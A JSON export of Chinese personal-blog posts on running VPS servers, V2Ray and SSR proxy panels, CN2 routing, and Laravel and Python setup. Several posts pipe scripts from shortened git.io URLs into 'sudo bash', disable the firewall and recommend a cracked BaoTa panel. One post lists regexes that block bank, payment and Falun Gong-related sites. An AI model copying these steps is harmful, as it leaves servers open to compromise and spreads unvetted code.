腾讯","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"阿里云服务器新开必做的几件事","slug":"AlibabaCloud-CentOS7-Pure-and-safe","date":"2019-03-12T13:46:20.000Z","updated":"2019-03-07T13:46:20.000Z","comments":true,"path":"AlibabaCloud-CentOS7-Pure-and-safe.html","permalink":"https://sobaigu.com/AlibabaCloud-CentOS7-Pure-and-safe.html","excerpt":"","text":"前言 阿里云大家都熟悉，许多人也都用过，体系内里一堆监控什么的很恶意，还曾经发生过不可描述的事情被程序员踢爆。 但有时候不得不承认，在搞个活动打折的情况下，阿里云服务器还是个好的选择。 所以，真香。 净化系统 此处脚本只适配了 centos7 ，且较长时间未更新，建议查看此文：阿里云VPS净化处理 如果是Windows服务器，可以参考：Windows服务器基础优化设置 开好系统后，第一件要做的事情必然是净化，去除监控，屏蔽某些IP，有大神做好了一键脚本，我们直接拿来用。 12345678#全新的安装sudo curl -sSL https://git.io/fhpMX | sudo bash #快照/镜像恢复sudo curl -sSL https://git.io/fhpMM | sudo bash #更换内核并安装LotServersudo curl -sSL https://git.io/fhpMD | sudo bash 想看具体做了啥自行查看脚本源文件，或者访问该项目Github地址。如果出现全新安装后，外网ip无法访问，则需要关闭防火墙。 12systemctl stop firewalld.servicesystemctl disable firewalld.service 替换BBR内核 同样的，一键安装锐速/BBR，为VPS提速，一键脚本暴力BBR： 1sudo curl -sSL https://git.io/vxJ1I | sudo bash 照提示选择自己要安装的内核即可。 开心宝塔 这个可能有些人不需要，但装个还是很方便的，用习惯了都变懒了，依旧是一键开心。 1sudo curl -sSL https://git.io/fprzD | sudo bash 该开心版是 v5.9.1 ，没有CentOS7x64限制，没有默认安全入口，没有强制用户名限制，推荐使用。如果想自己手动，可以参考宝塔面板假开心版实现方法","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"laravel执行 `php artisan key:generateerror` 及mailgun发信抛异常","slug":"laravel-class-translator-does-not-exist-client-error-post-401-mailgun","date":"2019-03-06T12:57:10.000Z","updated":"2019-03-06T12:57:10.000Z","comments":true,"path":"laravel-class-translator-does-not-exist-client-error-post-401-mailgun.html","permalink":"https://sobaigu.com/laravel-class-translator-does-not-exist-client-error-post-401-mailgun.html","excerpt":"","text":"错误1：class translator does not exist 搭的面板程序，因为有个释放端口不能重新分配有效端口的问题，对比了代码并无功能上的差异，百思不得其解。 索性，把整个目录删除了重新建。因为用的 githook 自动部署，所以也只是执行了一把 webhook ，谁知抛出异常： 12[root@xxx]# php artisan key:generateerrorIn Container.php line 767: class translator does not exist 这个问题基本上是基础框架环境安装不完整导致，在此前应该有个安装动作，可以删除 vendor 目录手动去执行一遍安装再试： 1php composer.phar install 错误2：Client error: 401 UNAUTHORIZED mailgun发信配置可能会出现这样的错误： 1Client error: `POST https://api.mailgun.net/v3/abc.xyz/messages.mime` resulted in a `401 UNAUTHORIZED` response: 网上搜出一堆解答，都说是配置错误导致的。可俺们之前发信好好的，这部分并没有任何更改，看mailgun日志又空了快个月了，这半个月我的邮件正常发的啊，百思不得其解！ 12MAILGUN_DOMAIN=sobaigu.com #mailgun配置的域名MAILGUN_SECRET=key-5673e708935axxxae32f0624c2 #mailgun账户的密钥，这里配私钥 就是上面的配置，之前私钥公钥轮流试了个遍，一样的错误，这期间可能和 queue 没有配合好，测试下来发现 queue 使用的是首次启动时的配置。 所以最后，把 MAILGUN_SECRET= 配成私钥，queue 进程杀了重启，然后就成了，神奇的是mailgun页面也有发信日志了，更神奇的是，之前一直配置的公钥用了快一年了，近一个月虽然日志空了但发信也是正常的！ 错误3：Client error: 400 BAD REQUEST` 如果提示这样的错误，基本上是买了滚把你账号禁用了，可以去找下通知邮件或者到买了滚后台去看下。 1Client error: `POST https://api.mailgun.net/v3/abc.xyz/messages.mime` resulted in a `400 BAD REQUEST` response: 参考链接 其他一些可能遇到的问题可参考：面板搭建相关设置问题","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"建个墙外墙，禁止访问银行，法轮大法等网站的正则表达式","slug":"cloud-server-tourist","date":"2019-03-02T04:04:34.000Z","updated":"2019-03-02T04:04:34.000Z","comments":true,"path":"cloud-server-tourist.html","permalink":"https://sobaigu.com/cloud-server-tourist.html","excerpt":"","text":"前言 因为某些需求，我们都要在外查点资料，好不容易出去了，却有人无脑受洗，造谣生事，不得已再开个小墙。 代码段 禁止百度定位 1regexp:(api|ps|sv|offnavi|newvector|ulog\\.imap|newloc)(\\.map|)\\.(baidu|n\\.shifen)\\.com 禁止360等国内网站 1regexp:(.*\\\\.||)(360|so|qq|163|sohu|sogoucdn|sogou|uc|58|taobao|qpic)\\.(org|com|net|cn) 禁止轮子等无脑站 12regexp:(.*\\\\.||)(dafahao|minghui|dongtaiwang|epochtimes|ntdtv|falundafa|wujieliulan|zhengjian)\\.(org|com|net)regexp:(.*\\\\.||)(shenzhoufilm|secretchina|renminbao|aboluowang|mhradio|guangming|zhengwunet|soundofhope|yuanming|zhuichaguoji|fgmtv|xinsheng|shenyunperformingarts|epochweekly|tuidang|shenyun|falundata|bannedbook)\\.(org|com|net) 禁止登陆支付网站 正常登录银行网站谁挂代理？挂代理必定有事，那就直接禁止吧！ 123regexp:(.*\\\\.||)(icbc|ccb|boc|bankcomm|abchina|cmbchina|psbc|cebbank|cmbc|pingan|spdb|citicbank|cib|hxb|bankofbeijing|hsbank|tccb|4001961200|bosc|hkbchina|njcb|nbcb|lj-bank|bjrcb|jsbchina|gzcb|cqcbank|czbank|hzbank|srcb|cbhb|cqrcb|grcbank|qdccb|bocd|hrbcb|jlbank|bankofdl|qlbchina|dongguanbank|cscb|hebbank|drcbank|zzbank|bsb|xmccb|hljrcc|jxnxs|gsrcu|fjnx|sxnxs|gx966888|gx966888|zj96596|hnnxs|ahrcu|shanxinj|hainanbank|scrcu|gdrcu|hbxh|ynrcc|lnrcc|nmgnxs|hebnx|jlnls|js96008|hnnx|sdnxs)\\.(org|com|net|cn)regexp:(.*\\\\.||)(unionpay|alipay|baifubao|yeepay|99bill|95516|51credit|cmpay|tenpay|lakala|jdpay)\\.(org|com|net|cn)regexp:(.*\\\\.||)(firstbank|bot|cotabank|megabank|tcb-bank|landbank|hncb|bankchb|tbb|ktb|tcbbank|scsb|bop|sunnybank|kgibank|fubon|ctbcbank|cathaybk|eximbank|bok|ubot|feib|yuantabank|sinopac|esunbank|taishinbank|jihsunbank|entiebank|hwataibank|csc|skbank)\\.(org|com|net|tw) 禁止BT 1bittorrent","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"『转载』中国电信出口网络的链路状态（区分 ChinaNet,CN2,GT,GIA）","slug":"chinanet-cncn-cn2gt-cn2gia","date":"2019-02-15T07:33:00.000Z","updated":"2019-02-15T07:33:00.000Z","comments":true,"path":"chinanet-cncn-cn2gt-cn2gia.html","permalink":"https://sobaigu.com/chinanet-cncn-cn2gt-cn2gia.html","excerpt":"","text":"前言 本文讲从几个方面去讲述中国电信出口网络的情况，阅读本文后让读者对使用中国电信连接海外网络中常用的术语与基本知识有一个大致的了解，以及当读者在购买国外高质量主机的时候，有个基本的链路判断，怎么去分辨，ChinaNet，CN2，CN2 GT，CN2 GIA 等线路。 基本 中国电信(China Telecom)，是中国最大的互联服务提供商，截止2018年1月，中国电信的总出口带宽数为 3.6 Tbps，为互联网用户提供高速稳定的全中国资源访问服务。目前，中国电信骨干网的三大国际出口分别是，北京，上海，广州，全国的出口网络最后都会汇集到这三个出口点。 分类 ChinaNet 全球最大的中文资源互联网络 ChinaNet，也叫 163 骨干网，AS4134，要纠正的一点是，很多人缪传一个”CN1″的叫法，这是毫无根据的，Chinatelecom Next Carrier Network，简称 CNCN，再简化为 CN2，CN1 这种叫法可能是看着 CN2 类比出来的，但是官方没有过这种叫法。但如果看到这种说法，你可能知道说的是 ChinaNet 也叫 163 网络。ChinaNet 为超过 8000 万宽带用户服务，同时向全球用户提供超过70%的中文网站的中文互联网资讯。绝大部分的出口带宽都是这种网络，ChinaNet 主要定位于承载普通质量的互联网业务，因为他基建早，带宽大，且足够便宜。 我们来用 Traceroute 路由表来看一下走 163 网络的出口路由情况。 可以看到无论是从出发地点到省级接口，省级接口到上海海外出口，然后到美国，走的都是 AS4134，ChinaNet 网络。 Chinatelecom Next Carrier Network(CN2) CN2，即是 ChinaNet 之后由中国电信发展的下一代承载网，AS4809，主要是为了提供更高质量要求的中国电信骨干承载网络而建立的工程。运营全球互联网转接服务，能够实现欧洲、北美和亚洲之间高速、大容量、安全、稳定转接服务。CN2 相比较 163 网络，带宽小得多，小是相对的因为相对受众少，但稳定高速，定位于承载企业级别的 VPN 业务，常用于政府，企业，金融类、游戏类等对延时敏感的业务。它提供更高质量的网络服务，接入 CN2 网络价格普遍要比 ChinaNet 贵上许多。 下图为 2016 年由中国电信国际有限公司官网提供的全球 CN2 接入点 下图为截止 2018 年 8 月中国电信国际有限公司官网提供的全球 GIS 接入点 可以看到中国大陆有四个出口点，北上广三个，另外还有一个乌鲁木齐，比较少见的哈塞克斯坦 CN2 网络，走的就是乌鲁木齐出口，即使这个也会先走北上广三个点，再跳到乌鲁木齐出口。 CN2 上又有很多的产品，主要包括 CN2 GT，CN2 GIA 两类。这里是否叫 CN2 GT 和 CN2 GIA 待考证，因为之前还流行叫半程 CN2，和全程 CN2 的叫法，可以肯定的是有两种运行在 CN2 的服务，一种价格便宜省级骨干走163，出口才走 CN2，一种价格昂贵全程走 CN2，目前主机圈主流叫法 CN2 GT 和 CN2 GIA。另外还有单程双程是另外一种分类，后面讲。 CN2 GT GT 英文是 Global Transit，为全球客户提供访问全球互联网资源的转接服务。提供给全球的通讯运营商，截止目前，中国电信已经与国际Tier1/2 运营商以及主流OTT建立超过5000G的互联带宽，本身接入网络是 ChinaNet(AS4134)，但是直连中国电信 CN2(AS4809) 的一个服务。CN2 GT 中国国际出口拥有自己的单独线路，但是在国内的链路还是使用的 163 骨干网络。 CN2 GIA GIA 英文是 Global Internet Access，为企业客户提供优质的中国方向互联网专线接入服务，注意 GIA 专指与中国的专线服务。主要是提供给企业的优质网络，本身接入网络 CN2(AS4809)，出口全程 CN2(AS4809) 路由，国际网路高速稳定链接中国内地网络。这种带宽的质量应当是电信网络最好的，但是缺点也比较明显，整个 GIA 的出口带宽较小，在较大流量攻击的时候更容易导致整个 GIA 下的网络波动。GIA 的主要优势是回国有单独的线路，高优先级，高质量，但接入价格较贵。 单程（单向） CN2 我们知道，路由是双向的，去和回，单程 CN2 就是指，只有一边的走 CN2，另一边走的其他的网络。可能有两种情况 去程 CN2，回程 ChinaNet。这种情况常见，主要是很多主机商拿来打 CN2 广告的噱头，CN2 去程能够很容易被评测出来。但其实，去程 CN2 并没有什么太大作用只是减小去了去的时延，因为我们知道在普通用户的网络访问情况中，回来的流量要比去的要大得多，单程 CN2 要便宜一些，因为流量使用的少，比纯 ChinaNet 算下来还是要贵一点，有点鸡肋的感觉，弃之可惜，食之无味。 去程 ChinaNet，回程 CN2。这也是一种组合的单程 CN2，这种情况，主要是为了兼顾抗 DDoS，速度和价格三方面，纯 CN2 网络相对脆弱，遭遇量大的 DDoS 后，很快就会把链路占满，造成出口拥塞（CN2 链路遭遇大量 DDoS 攻击时也会自动切到 163 网络）。163 网络带宽容量大，从中国内地出去的出去的攻击能够被很好的承载，而回程又走 CN2 线路，加快速度。普遍上，单程回 CN2，比单程去 CN2 花费高，因为回程的量在互联网服务中占多数。这种情况下，是综合抗DDoS（如果有），速度，价格的折中的最优解，适合容易遭受攻击，且需要速度的需求，当然最好的当然还是双程的。 双程（双向） CN2 去程回程都走 CN2 网络。其中包含 CN2 GT 和 CN2 GIA。 单程同理，包含 CN2 GT 和 CN2 GIA 两种。 CN2 延迟排序 根据中国电信国际有限公司官网数据提供的 2018 年 5，6，7 月三个月的 CN2 质量平均情况（未知端点城市，看着像上海，也可能是几个城市平均下来的数据），理论上可看作为最佳情况下，常见 CN2 节点城市与中国连接延迟排序（ms） 香港 首尔 东京 新加坡 莫斯科 圣何塞 洛杉矶 法兰克福 西雅图 28.27 60.37 67.32 67.65 134.78 166.44 175.62 180.65 185.47 怎么判断 CN2 GT 和 CN2 GIA 无论接入的是 GT CN2 还是 GIA CN2，都保证国家与国家之间的传输在 CN2 骨干网内进行，路由中有 ip 开头为 59.43.*，AS4809，首先即判断有一段为 CN2 网络。CN2 上承载了两个较为常见的套餐，那怎么判断是哪一种呢，我们来分析几种特殊情况。 CN2 GT 的省级出口为 202.97 节点（163骨干网节点），在跨境时才进入 CN2 骨干网，国际跨境节点为 59.43 开头。即使处在 CN2 节点城市，如上海，也会先走 202.97 节点。以此类推其他城市，不再列出。可见目前所有的 CN2 GT 路由都会有 202.97 开头的 ip CN2 GIA 在部署开通有 CN2 节点的省份城市接入该省的省级 CN2 节点，在暂未部署 CN2 节点的省份城市则就近接入北上广节点。(此点不够严谨，特例情况除外，详情看评论区，感谢 Test IP 指出) 本省有 CN2，但非节点城市，如江苏镇江，经南京 202.97 节点进入江苏南京 CN2 节点，最后进入广州 CN2 出口节点。 本省无 CN2，如重庆，经过重庆 163 节点，进入广州 202.97 节点，然后接入广州 CN2 节点 所以这两种情况虽然是 CN2 GIA 但也会先走 202.97，而如果是在上海和其他 CN2 节点城市，这种情况下的 GIA 才不会有 202.97 出现。所以有的说法里面讲有 202.97 就是 CN2 GT 的这个观点，是错误的。 截止目前，我所知的国内走 CN2 节点城市有，成都，南京，西安，武汉，乌鲁木齐，广州，上海，北京。 了解了以上知识点之后，最简单判断 GT 还是 GIA 的方法，直接用上海电信 traceroute，有 59.43 先是 CN2，再无 202.97 即为 GIA。 其他 补充一 这里要分清的一点是，ChinaNet 和 CN2 是骨干网的分类，而以下四个则是，中国电信提供的国际互联网服务 Global Internet Services（GIS）下的四个产品，具体不细说了，有兴趣自查。所以说 CN2 GT 和 CN2 GIA 可以理解为运行在 CN2 承载网上的 GT 或 GIA 服务。 以下四段摘自中国电信国际有限公司官网，GIS 产品介绍。 Global Transit（GT） 为全球客户提供访问全球互联网资源的转接服务。 Global Internet Access(GIA) 为企业客户提供优质的中国方向互联网专线接入服务。 ChinaNet Paid-Peer 为全世界运营商和OTT用户提供中国电信中文互联网资源的最短路由接入服务。 China Access 为全球客户提供一站式的中文互联网资源接入服务。 补充二 无论什么网络，路由都不是固定，路由是时刻动态的，随时会变，这个变，由你自身（比如本地精品网络CN2用户），或者你连接的网络（比如提供CN2的服务器）与通信提供商签约的合同而定，也由网络容量，稳定情况而定。 最后 中国电信的出口网络，依然是占中国出口网络带宽的几乎一半之多，但是使用人数也是最多的，从使用情况经验上来看，呈现高峰明显拥堵，低峰充足。 本文转载自：https://www.oldking.net/751.html 图片引自：https://www.vpsps.com/1017.html","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"SSR错误提示：ImportError No module named peewee","slug":"no-module-named-peewee-when-python-server-py","date":"2019-01-10T14:42:16.000Z","updated":"2019-01-10T14:42:16.000Z","comments":true,"path":"no-module-named-peewee-when-python-server-py.html","permalink":"https://sobaigu.com/no-module-named-peewee-when-python-server-py.html","excerpt":"用一键安装脚本Shadowsocksr 安装完成后，一切看上去都顺风顺水，可是执行 python server.py 报了以下错误：","text":"用一键安装脚本Shadowsocksr 安装完成后，一切看上去都顺风顺水，可是执行 python server.py 报了以下错误： 12345678[root@x shadowsocksr]# python server.pyFile &quot;server.py&quot;, line 25, inimport db_transferFile &quot;/root/shadowsocksr/db_transfer.py&quot;, line 13, infrom database import *File &quot;/root/shadowsocksr/database/init.py&quot;, line 9, infrom peewee import *ImportError: No module named peewee 这个问题是因为依赖库缺失，奇怪的是安装的时候并没有任何错误提示。解决这个问题我们只需要将对应的依赖安装上就可以了。 首先安装 pip，CentOS用以下命令： 12yum install -y python-setuptools m2cryptoeasy_install pip Ubuntu用下面的命令： 1apt install -y python-pip m2crypto 安装完 pip后就可以安装缺失的依赖了，提示缺什么安装什么即可。 1pip install pymysql peewee pickle 可能在某些情况下设置了比较特殊的协议，如 chacha20，此时你还需要安装额外的依赖： 1234567cd /usr/rm -rf /usr/libsodium-1.0.16wget https://github.com/jedisct1/libsodium/releases/download/1.0.16/libsodium-1.0.16.tar.gztar xf libsodium-1.0.16.tar.gz &amp;&amp; cd libsodium-1.0.16./configure &amp;&amp; make -j2 &amp;&amp; make installecho /usr/local/lib &gt; /etc/ld.so.conf.d/usr_local_lib.confrm -rf libsodium-1.0.16.tar.gz","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"},{"name":"教程","slug":"教程","permalink":"https://sobaigu.com/tags/%E6%95%99%E7%A8%8B/"}]},{"title":"V2Ray接入面板踩过的坑整理","slug":"ssrpanel-v2ray-go","date":"2018-12-28T15:23:07.000Z","updated":"2018-12-28T15:23:07.000Z","comments":true,"path":"ssrpanel-v2ray-go.html","permalink":"https://sobaigu.com/ssrpanel-v2ray-go.html","excerpt":"","text":"前言 前段时间死了好大一片服务器，眼看这么多服务器砸手里，简直血本无归。为了能活得更久，潜心研究了V2Ray，踩过了不少坑，整理一下。 程序选型 单用户自己的服务器安装个V2Ray使用很方便，官方或者233boy的一键脚本安装上就可以，但要对接到面板，一开始折腾了不少精力。 如果VPS是KVM的，那直接用人家做好的docker也行，无非就是资源多耗点。如果是openvz就没法用docker了，需要使用自己配置安装版。对接面板程序有人做了Java版和go版，Java版自己的垃圾服务器上运行一段时间就会出现连不上，需要重启。最后使用了go版，目前来看很稳定，而且还做好了服务启动，方便。 面板节点设置 面板中设置V2Ray节点，额外ID，协议等，稍后服务端和客户端配置需要匹配起来，这里需要注意一点，伪装网站是访问443或80端口的时候打开的内容，所以伪装网站和节点绑定域名就是同一个！！！最多伪装内容来源可以是本地网站或者反代到其他站。 一键安装脚本 抄了大佬们一堆shell，组装了个一键脚本自己用，只支持CentOS7和Ubuntu，有bug或不灵，自己去琢磨。 该项目已更名为 v2ray-poseidon 且变更为收费项目，收费授权版简化了配置过程，如果要用免费版仍然可以用此垃圾脚本。 12wget https://raw.githubusercontent.com/cdnf/Shell/master/deploy_node.shbash deploy_node.sh 脚本选 1 自动安装并配置V2Ray为 WS+TLS 方案，天然可以网站伪装，还可以套CDN实现死鸡鸡复活。需要配置的信息如下： 伪装域名: 填你这个节点地址绑定的域名，如：sobaigu.com 申请CA证书：y 配置Caddy在线申请，否则使用自签证书 转发路径『不要带/』: 如访问地址为 http://sobaigu.com/game ，/game 即是所谓的路径，此处填 game 就可以了 V2Ray端口: 顾名思义，V2Ray监听的端口，如 10086 V2Ray额外ID: 顾名思义，如 16 面板同步端口: 从面板同步过来的用户及配置信息，传递给V2Ray的端口，如 10087 节点ID: 面板中该节点对应的ID，如 6 数据库地址: 顾名思义，如 db.sobaigu.com 或 1.1.1.1 数据库名称: 顾名思义，如 ssrpanel 数据库用户: 顾名思义，如 ssrpanel 数据库密码: 顾名思义，如 ssrpanel 以上配置都要和面板上的配置对应起来，不知道怎么配的去看胖虎的Wiki，所有的端口请都不要占用 80，443『caddy默认用了这俩端口』 和 3306『V2Ray配置里直接就这个默认了，如果数据库端口不是这个端口的自己去改』 这几个默认端口！！！选 1 安装时会自动放个2048小游戏网站，其他代理到别站的伪装请自己去手动操作。 caddy V2Ray推荐使用 websocket+TLS 协议，外加域名伪装，用caddy比较小巧合适，配置也比nginx简单，推荐用。关键是配置，注意看注释。 caddy配置路径：/etc/caddy/Caddyfile， 12345678910DomainName &#123; //这个 DomainName 就是伪装域名，也就是节点绑定的域名 root /srv/www //伪装内容，路径根据自己实际情况改，一键安装默认是这个位置 tls UserName@gmail.com gzip timeouts none proxy /game 127.0.0.1:10086 &#123; //带 /game 访问时转到本地V2Ray端口处理 websocket header_upstream -Origin &#125;&#125; 上面是一键脚本的默认配置，也可以如下反向代理到其他网址，如：https://sobaigu.com 123456789101112DomainName &#123; //建议申请证书前关闭cdn，申请成功一次就可以开了 tls UserName@gmail.com gzip timeouts none proxy / https://sobaigu.com &#123; //这个反向代理目标就是所谓的伪装域名内容源 without /game &#125; proxy /game 127.0.0.1:10086 &#123; websocket header_upstream -Origin &#125;&#125; 以上配置，当访问 DomainName 时，打开 www 下的首页或跳转到反向代理的域名，当带路径 /game 访问时，则代理到 10086 端口，这个端口也就是V2Ray的端口。 V2Ray V2Ray配置路径：/etc/v2ray/config.json 看上去很复杂，其实搞懂了规则还好，自己看注释吧。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&#123; &quot;log&quot;: &#123; &quot;loglevel&quot;: &quot;debug&quot; //调试正常后日志输出级别建议改成error &#125;, &quot;api&quot;: &#123; &quot;tag&quot;: &quot;api&quot;, &quot;services&quot;: [ &quot;HandlerService&quot;, &quot;LoggerService&quot;, &quot;StatsService&quot; ] &#125;, &quot;stats&quot;: &#123;&#125;, &quot;inbounds&quot;: [ &#123; &quot;listen&quot;: &quot;127.0.0.1&quot;, &quot;port&quot;: usersync_Port, //同步面板用户及配置的端口 &quot;protocol&quot;: &quot;dokodemo-door&quot;, &quot;settings&quot;: &#123; &quot;address&quot;: &quot;127.0.0.1&quot; &#125;, &quot;tag&quot;: &quot;api&quot; &#125;, &#123; &quot;tag&quot;: &quot;proxy&quot;, &quot;port&quot;: v2ray_Port, //V2Ray代理端口，和caddy那边对起来 &quot;protocol&quot;: &quot;vmess&quot;, &quot;settings&quot;: &#123; &quot;clients&quot;: [], &quot;disableInsecureEncryption&quot;: true, //禁止客户端使用不安全的加密方式 &quot;default&quot;: &#123; &quot;level&quot;: 0, &quot;alterId&quot;: alter_Id //额外ID要和客户端最好配置一致，实测不一致也没毛病 &#125; &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;ws&quot;, //用其他协议的自己去参考官方文档改 &quot;wsSettings&quot;: &#123; &quot;path&quot;: &quot;/game&quot; //代理路径，和caddy那边对起来，实际测试删除该配置好像也行 &#125; &#125; &#125; ], &quot;outbounds&quot;: [&#123; &quot;protocol&quot;: &quot;freedom&quot; &#125;], &quot;routing&quot;: &#123; &quot;rules&quot;: [&#123; &quot;type&quot;: &quot;field&quot;, &quot;inboundTag&quot;: [ &quot;api&quot; ], &quot;outboundTag&quot;: &quot;api&quot; &#125;], &quot;strategy&quot;: &quot;rules&quot; &#125;, &quot;policy&quot;: &#123; &quot;levels&quot;: &#123; &quot;0&quot;: &#123; &quot;statsUserUplink&quot;: true, &quot;statsUserDownlink&quot;: true &#125; &#125;, &quot;system&quot;: &#123; &quot;statsInboundUplink&quot;: true, &quot;statsInboundDownlink&quot;: true &#125; &#125;, &quot;ssrpanel&quot;: &#123; &quot;nodeId&quot;: 11, //面板分配的节点ID // every N seconds &quot;checkRate&quot;: 300, // user config &quot;user&quot;: &#123; // inbound tag, which inbound you would like add user to &quot;inboundTag&quot;: &quot;proxy&quot;, &quot;level&quot;: 0, &quot;alterId&quot;: alter_Id, //对应上面的额外ID &quot;security&quot;: &quot;none&quot; &#125;, // db connection &quot;mysql&quot;: &#123; &quot;host&quot;: &quot;db_Host&quot;, &quot;port&quot;: db_Port, //这个默认3306应该没人会改吧？ &quot;user&quot;: &quot;db_User&quot;, &quot;password&quot;: &quot;db_Password&quot;, &quot;dbname&quot;: &quot;db_Name&quot; &#125; &#125;&#125; 可能遇到的问题 客户端加密方式 之前出现烂苹果小火箭不能正常使用的情况，发现是服务端拒绝了不安全的加密方式，经高手点拨，原来官网有说明： 123456789&quot;settings&quot;: &#123; &quot;clients&quot;: [], &quot;disableInsecureEncryption&quot;: true, //禁止客户端使用不安全的加密方式 &quot;default&quot;: &#123; &quot;level&quot;: 0, &quot;alterId&quot;: alter_Id //额外ID要和客户端最好配置一致，实测不一致也没毛病 &#125;&#125;, 之前懒人配置样本里默认设置为了 true ，表示启用禁止客户端使用不安全的加密方式，解决方法是更新胖虎面板程序添加设置加密方式，或者将配置改成 false 即可： 1&quot;disableInsecureEncryption&quot;: false, //禁止客户端使用不安全的加密方式 懒人脚本使用的配置样本已更改为 false 感谢技术佬无私分享。 Caddy启动失败 此种情况常见就是开启了 tls 但自动申请证书失败，多半是你的IP在短时间内申请次数太多或者域名入了黑名单，具体原因自行判断，本懒人脚本已将证书默认为自签，其他解决办法可参考：Caddy自动申请CA证书失败解决办法 已经装了Nginx能不能用 有Nginx的话也可以，Caddy就不要装了，Nginx上建个vhost，然后使用Nginx反代就可以了，可参考：Nginx反向代理配置规则","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"v2ray","slug":"v2ray","permalink":"https://sobaigu.com/tags/v2ray/"}]},{"title":"python升级安装","slug":"python-install-upgrade-by-src","date":"2018-12-17T08:43:32.000Z","updated":"2018-12-17T08:43:32.000Z","comments":true,"path":"python-install-upgrade-by-src.html","permalink":"https://sobaigu.com/python-install-upgrade-by-src.html","excerpt":"","text":"前言 Linux系统自带的python一般都是2.6版的，可现在很多的应用都是基于python3，所以有时候需要对python进行升级，此处以CentOS为例，其他大同小异。 安装基础依赖 某些系统可能基础软件包未安装，我们执行一遍安装，已经安装过的会自带略过。 123yum install -y gcc wget unzipyum install -y openssl-static zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-develyum groupinstall &quot;Development tools&quot; 下载并编译安装Python3 直接从官网下载安装，用root权限安装。 123wget http://python.org/ftp/python/3.6.1/Python-3.6.1.tar.xz# 下载完成后解压tar xf Python-3.6.1.tar.xz 切换到解压后的文件夹内编译安装 1234cd Python-3.6.1# --prefix设置安装目录./configure --prefix=/usr/local/python3make &amp;&amp; make install 添加到环境变量 如果不添加到环境变量，直接输入 python3 命令的时候会提示找不到该命令，所以我们需要将其添加到系统变量： 12ln -s /usr/local/python3/bin/python3 /usr/bin/python3ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 链接完后，在任何路径下输入 python3 -V 这样的命令都能认到了。 安装pip 如果输出提示没有pip，则执行pip的安装 12wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.py 安装完成可以执行 python3 -m pip -V 看下是否好使。同样的，我们需要将pip 添加到系统环境变量，编辑 /etc/profile，在末尾添加如下内容并保存退出。 1export PATH=&quot;/usr/local/python3/bin:$PATH&quot; 然后运行 source /etc/profile 就可以实时更新状态了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"python","slug":"python","permalink":"https://sobaigu.com/tags/python/"}]},{"title":"v2ray新手使用指南之：苹果手机Kitsunebi","slug":"v2ray-IOS-Kitsunebi","date":"2018-12-13T14:59:04.000Z","updated":"2018-12-13T14:59:04.000Z","comments":true,"path":"v2ray-IOS-Kitsunebi.html","permalink":"https://sobaigu.com/v2ray-IOS-Kitsunebi.html","excerpt":"Kitsunebi是一个基于 V2Ray 核心的 iOS 应用，支持导入和导出与 V2Ray 兼容的 JSON 配置，由于使用 V2Ray 核心，Kitsunebi 几乎支持 V2Ray 的所有功能，比如 Mux 和 mKCP。","text":"Kitsunebi是一个基于 V2Ray 核心的 iOS 应用，支持导入和导出与 V2Ray 兼容的 JSON 配置，由于使用 V2Ray 核心，Kitsunebi 几乎支持 V2Ray 的所有功能，比如 Mux 和 mKCP。 第一步：下载安装 Kitsunebi App Store下载地址 购买安装这些好像没什么好说的，烂水果都舍得买，再花个五块十块美金也不在话下。 没有美区Apple ID可以自己去找他们客服要Apple ID回来下载。 第二步：添加服务器节点 获取服务器节点信息请参考公共的节点信息获取方法。 首次启动应该会有系统提示，一定要点 允许 或者 Allow 点击 Kitsunebi Lite 主界面右上角的 +号会弹出二级菜单，剩下的自己选择方法添加服务器信息即可： 第三步：开启代理 比如是通过扫描二维码添加服务器，那么后点击 OK 后会自动设置好服务器信息，点击 Kitsunebi Lite 主界面的 连接按钮 